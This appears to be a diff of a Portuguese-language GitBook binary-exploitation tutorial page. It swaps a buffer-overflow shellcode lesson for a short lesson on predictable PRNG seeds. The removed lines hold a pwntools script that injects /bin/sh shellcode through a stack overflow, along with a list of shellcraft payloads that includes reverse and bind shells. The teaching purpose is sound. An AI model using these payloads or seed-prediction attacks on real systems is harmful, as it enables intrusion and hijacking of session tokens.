@@ -4,7 +4,7 @@
     <head>
         <meta charset="UTF-8">
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
-        <title>Buffer Overflow - ShellCode · GitBook</title>
+        <title>Bad seed · GitBook</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="description" content="">
         <meta name="generator" content="GitBook 3.2.3">
@@ -57,10 +57,10 @@
     <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
 
     
-    <link rel="next" href="3_format_strings.html" />
+    <link rel="next" href="../fast_food/beginning.html" />
     
     
-    <link rel="prev" href="2_2_bof_callfunction.html" />
+    <link rel="prev" href="5_integer_overflow.html" />
     
 
     </head>
@@ -240,7 +240,7 @@
             
         </li>
     
-        <li class="chapter active" data-level="1.3.1.3" data-path="2_3_bof_shellcode.html">
+        <li class="chapter " data-level="1.3.1.3" data-path="2_3_bof_shellcode.html">
             
                 <a href="2_3_bof_shellcode.html">
             
@@ -292,7 +292,7 @@
             
         </li>
     
-        <li class="chapter " data-level="1.3.1.7" data-path="6_bad_seed.html">
+        <li class="chapter active" data-level="1.3.1.7" data-path="6_bad_seed.html">
             
                 <a href="6_bad_seed.html">
             
@@ -532,7 +532,7 @@
     <!-- Title -->
     <h1>
         <i class="fa fa-circle-o-notch fa-spin"></i>
-        <a href=".." >Buffer Overflow - ShellCode</a>
+        <a href=".." >Bad seed</a>
     </h1>
 </div>
 
@@ -547,88 +547,15 @@
     
                                 <section class="normal markdown-section">
                                 
-                                <h2 id="24-buffer-overflow---shellcode">2.4 Buffer Overflow - Shellcode</h2>
-<p>Shell Code &#xE9; um <strong>pequeno trecho de c&#xF3;digo em Assembly usado como payload (carga &#xFA;til) em um ataque</strong>. O c&#xF3;digo &#xE9; muito pequeno por ser em assembly, portanto apenas poucos bytes s&#xE3;o necess&#xE1;rios, dependendo do shellcode.</p>
-<p>Com shellcode, <strong>fazemos o programa rodar funcionalidades que o programador n&#xE3;o escreveu</strong>. Normalmente, shellcode &#xE9; utilizado para fazer uma chamada de API do Windows ou Syscall no Linux.</p>
-<p>No C, estar&#xED;amos fazendo algo como:</p>
-<pre><code class="lang-C"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
-    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>); <span class="hljs-comment">// Chama shell</span>
-    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
-}
+                                <h1 id="bad-seed">Bad Seed</h1>
+<p>Um &quot;bad seed&quot; &#xE9; quando um gerador de n&#xFA;meros pseudoaleat&#xF3;rios (PRNG) &#xE9; inicializad com uma semente previs&#xED;vel ou insuficientemente aleat&#xF3;ria, permitindo que todos os n&#xFA;meros gerados possam ser previstos. </p>
+<p>Caso voc&#xEA; n&#xE3;o saiba, as fun&#xE7;&#xF5;es que geram n&#xFA;meros aleat&#xF3;rios n&#xE3;o s&#xE3;o realmente aleat&#xF3;rias. Elas capturam dados aleat&#xF3;rios e transformam em n&#xFA;meros atrav&#xE9;s de um algoritmo, como data e hora, temperatura do processador, etc. Se dermos um n&#xFA;mero inicial, uma &quot;seed&quot; ao pseudogerador, ele sempre ir&#xE1; gerar os mesmos n&#xFA;meros aleat&#xF3;rios em sequ&#xEA;ncia. Se voc&#xEA; descobrir a seed, voc&#xEA; descobre todos os n&#xFA;meros gerados.</p>
+<p>Exemplos de seeds:</p>
+<pre><code class="lang-c">srand(getpid());  <span class="hljs-comment">// Process ID tem apenas ~32k possibilidades</span>
+srand(<span class="hljs-number">12345</span>); <span class="hljs-comment">// Sempre a mesma sequ&#xEA;ncia</span>
+srand(time(<span class="hljs-literal">NULL</span>)); <span class="hljs-comment">// Previs&#xED;vel se o tempo for conhecido</span>
 </code></pre>
-<p>O Shellcode &#xE9; a vers&#xE3;o compacta disso, em assembly, que pode ser injetada na mem&#xF3;ria atrav&#xE9;s de um input. Ou seja, <strong>Shellcode &#xE9; c&#xF3;digo Assembly normal</strong>, nada especial.</p>
-<p>A raz&#xE3;o pela qual Shellcode possui sucesso &#xE9; por que <strong>o computador n&#xE3;o diferencia dados e instru&#xE7;&#xF5;es</strong>. N&#xE3;o importa onde ou como voc&#xEA; fala para rodar, o computador VAI tentar rodar. Assim, mesmo que nosso input seja apenas dados, o computador n&#xE3;o sabe disso.</p>
-<h3 id="241-inimigos-do-shellcode-pie-e-dep">2.4.1 Inimigos do Shellcode: PIE e DEP</h3>
-<p>PIE (Position-Independent Executables) &#xE9; uma t&#xE9;cnica de seguran&#xE7;a que randomiza a mem&#xF3;ria do programa. Para realizar shellcode, precisamos saber exatamente o que vamos fazer. O PIE pode ser burlado se voc&#xEA; conseguir vazar os endere&#xE7;os de mem&#xF3;ria que precisa, mas isso n&#xE3;o vem ao caso agora.</p>
-<p>A outra prote&#xE7;&#xE3;o &#xE9; o DEP (Data Execution Prevention). Esse &#xE9; mais mortal, pois impede que &#xE1;reas da mem&#xF3;ria que deveriam conter apenas dados (stack, heap) sejam executadas como c&#xF3;digo. O que contorna isso s&#xE3;o os ataques de ROP. Ou seja, nada de injetar c&#xF3;digo novo, s&#xF3; podemos reaproveitar o que j&#xE1; existe no c&#xF3;digo.</p>
-<h3 id="242-usando-bof-shellcode">2.4.2 Usando BOF Shellcode</h3>
-<p>Basicamente:</p>
-<ol>
-<li>Identifique se &#xE9; poss&#xED;vel fazer BOF</li>
-<li>Coloque o <strong>Shellcode no Input</strong> + <strong>Padding at&#xE9; <code>return address</code></strong> + <strong>Endere&#xE7;o do in&#xED;cio do Shellcode na stack</strong></li>
-<li>Sim, acabamos de mandar o <code>RIP</code> executar instru&#xE7;&#xE3;o na stack.</li>
-</ol>
-<p>Exemplo com pwntools, abrindo uma shell (<code>shellcraft.sh()</code>):</p>
-<pre><code class="lang-py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
-
-context.binary = ELF(<span class="hljs-string">&apos;./program&apos;</span>)
-
-p = process()
-
-payload = asm(shellcraft.sh())          <span class="hljs-comment"># Shellcode</span>
-payload = payload.ljust(<span class="hljs-number">312</span>, <span class="hljs-string">b&apos;A&apos;</span>)      <span class="hljs-comment"># Padding</span>
-payload += p32(<span class="hljs-number">0xffffcfb4</span>)              <span class="hljs-comment"># Endere&#xE7;o do Shellcode</span>
-
-log.info(p.clean())
-
-p.sendline(payload)
-
-p.interactive()
-</code></pre>
-<h3 id="244-shellcode--pwntools">2.4.4 ShellCode + pwntools</h3>
-<pre><code class="lang-py"><span class="hljs-comment"># Shellcodes prontos populares</span>
-shellcraft.sh()           <span class="hljs-comment"># /bin/sh</span>
-shellcraft.cat(<span class="hljs-string">&apos;file&apos;</span>)    <span class="hljs-comment"># cat file</span>
-shellcraft.dupsh()        <span class="hljs-comment"># Duplica shell para fd</span>
-shellcraft.echo(<span class="hljs-string">&apos;text&apos;</span>)   <span class="hljs-comment"># Imprime texto</span>
-shellcraft.exit()         <span class="hljs-comment"># Sai do processo</span>
-shellcraft.findpeersh()   <span class="hljs-comment"># Encontra peer shell</span>
-
-<span class="hljs-comment"># Redes</span>
-shellcraft.connect(<span class="hljs-string">&apos;ip&apos;</span>, port)
-shellcraft.bindsh(port)
-shellcraft.reverse(<span class="hljs-string">&apos;ip&apos;</span>, port)
-
-<span class="hljs-comment"># Sistema de arquivos</span>
-shellcraft.getdents(fd)
-shellcraft.getcwd()
-</code></pre>
-<p>Exemplo: </p>
-<pre><code class="lang-py"><span class="hljs-comment">#!/usr/bin/env python3</span>
-<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
-
-<span class="hljs-comment"># Configurar</span>
-context.binary = ELF(<span class="hljs-string">&apos;./program&apos;</span>)
-
-p = process()
-
-print(<span class="hljs-string">&quot;Gerando shellcode /bin/sh...&quot;</span>)
-
-<span class="hljs-comment"># Gerar shellcode</span>
-shellcode = asm(shellcraft.sh())
-
-print(f<span class="hljs-string">&quot;Shellcode: {len(shellcode)} bytes&quot;</span>)
-print(hexdump(shellcode))
-
-<span class="hljs-comment"># Disassemblar para ver as instru&#xE7;&#xF5;es</span>
-print(<span class="hljs-string">&quot;\\nInstru&#xE7;&#xF5;es Assembly:&quot;</span>)
-print(disasm(shellcode))
-
-<span class="hljs-comment"># Testar (opcional - descomente para executar)</span>
-<span class="hljs-comment"># print(&quot;\\n&#x1F680; Executando shellcode...&quot;)</span>
-<span class="hljs-comment"># p = run_shellcode(shellcode)</span>
-<span class="hljs-comment"># p.interactive()</span>
-</code></pre>
+<p>O ataque consiste em descobrir a seed, ou como ela &#xE9; gerada. Com isso, podemos prever tokens de sess&#xE3;o, quebrar chaves criptogr&#xE1;ficas derivadas de PRNGs fracos e at&#xE9; mesmo prever cartas/resultados de cassinos online. </p>
 
                                 
                                 </section>
@@ -656,12 +583,12 @@ print(disasm(shellcode))
 
             
                 
-                <a href="2_2_bof_callfunction.html" class="navigation navigation-prev " aria-label="Previous page: Buffer Overflow - CallFunction">
+                <a href="5_integer_overflow.html" class="navigation navigation-prev " aria-label="Previous page: Integer Overflow">
                     <i class="fa fa-angle-left"></i>
                 </a>
                 
                 
-                <a href="3_format_strings.html" class="navigation navigation-next " aria-label="Next page: Format Strings">
+                <a href="../fast_food/beginning.html" class="navigation navigation-next " aria-label="Next page: Fast Food">
                     <i class="fa fa-angle-right"></i>
                 </a>
                 
@@ -672,7 +599,7 @@ print(disasm(shellcode))
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"Buffer Overflow - ShellCode","level":"1.3.1.3","depth":3,"next":{"title":"Format Strings","level":"1.3.1.4","depth":3,"path":"pwning/3_format_strings.md","ref":"./pwning/3_format_strings.md","articles":[]},"previous":{"title":"Buffer Overflow - CallFunction","level":"1.3.1.2","depth":3,"path":"pwning/2_2_bof_callfunction.md","ref":"./pwning/2_2_bof_callfunction.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css","website":"styles/website.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css","website":"styles/website.css"}},"file":{"path":"pwning/2_3_bof_shellcode.md","mtime":"2025-12-18T20:49:19.892Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2025-12-21T02:45:52.953Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"Bad seed","level":"1.3.1.7","depth":3,"next":{"title":"Fast Food","level":"1.4","depth":1,"path":"fast_food/beginning.md","ref":"./fast_food/beginning.md","articles":[{"title":"Fast Intro","level":"1.4.1","depth":2,"path":"fast_food/introduction/1_beggining.md","ref":"./fast_food/introduction/1_beggining.md","articles":[{"title":"Assembly CheatSheet","level":"1.4.1.1","depth":3,"path":"fast_food/introduction/2_assembly.md","ref":"./fast_food/introduction/2_assembly.md","articles":[]},{"title":"Endianness","level":"1.4.1.2","depth":3,"path":"fast_food/introduction/3_endianness.md","ref":"./fast_food/introduction/3_endianness.md","articles":[]},{"title":"Ghidra","level":"1.4.1.3","depth":3,"path":"fast_food/introduction/4_ghidra.md","ref":"./fast_food/introduction/4_ghidra.md","articles":[]},{"title":"GDB CheatSheet","level":"1.4.1.4","depth":3,"path":"fast_food/introduction/5_gdb.md","ref":"./fast_food/introduction/5_gdb.md","articles":[]},{"title":"Pwntools CheatSheet","level":"1.4.1.5","depth":3,"path":"fast_food/introduction/6_pwntools.md","ref":"./fast_food/introduction/6_pwntools.md","articles":[]}]},{"title":"Fast Pwning","level":"1.4.2","depth":2,"path":"pwning/1_beginning.md","ref":"./pwning/1_beginning.md","articles":[{"title":"Proteções de binários","level":"1.4.2.1","depth":3,"path":"fast_food/pwning/2_protections.md","ref":"./fast_food/pwning/2_protections.md","articles":[]},{"title":"Buffer Overflow - Variáveis","level":"1.4.2.2","depth":3,"path":"fast_food/pwning/3_bof.md","ref":"./fast_food/pwning/3_bof.md","articles":[]},{"title":"Buffer Overflow - CallFunction","level":"1.4.2.3","depth":3,"path":"fast_food/pwning/4_bof_callfunction.md","ref":"./fast_food/pwning/4_bof_callfunction.md","articles":[]},{"title":"Buffer Overflow - ShellCode","level":"1.4.2.4","depth":3,"path":"fast_food/pwning/5_bof_shellcode.md","ref":"./fast_food/pwning/5_bof_shellcode.md","articles":[]},{"title":"Format Strings","level":"1.4.2.5","depth":3,"path":"fast_food/pwning/6_format_strings.md","ref":"./fast_food/pwning/6_format_strings.md","articles":[]}]}]},"previous":{"title":"Integer Overflow","level":"1.3.1.6","depth":3,"path":"pwning/5_integer_overflow.md","ref":"./pwning/5_integer_overflow.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css","website":"styles/website.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css","website":"styles/website.css"}},"file":{"path":"pwning/6_bad_seed.md","mtime":"2025-12-21T02:42:25.156Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2025-12-21T02:45:52.953Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
